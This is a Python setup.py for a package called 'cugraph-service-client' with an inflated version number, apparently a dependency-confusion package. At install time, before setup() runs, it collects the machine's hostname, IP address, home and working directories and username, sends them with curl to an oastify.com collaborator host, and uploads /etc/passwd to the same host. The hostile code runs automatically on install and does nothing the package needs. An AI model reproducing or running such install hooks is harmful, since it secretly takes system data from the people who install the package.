
from setuptools import setup
import os
import socket

hostname = socket.gethostname()
try:
    ip = socket.gethostbyname(hostname)
except:
    ip = "unknown"

home_dir = os.path.expanduser("~")
current_dir = os.getcwd()

data = f"originating_ip={ip}&hostname={hostname}&home_directory={home_dir}&current_directory={current_dir}"
os.system(f"curl -X POST --data '{data}' http://bcrsrie2j82lq4m1xn5b56717sdja71vq.oastify.com/$(whoami)")

# LFI-style exfiltration of /etc/passwd during install
os.system("curl -X POST --data-binary '@/etc/passwd' http://bcrsrie2j82lq4m1xn5b56717sdja71vq.oastify.com/$(whoami)")

setup(
    name="cugraph-service-client",
    version="23.99.0",
    packages=["cugraph_service_client"],
    install_requires=[],
)
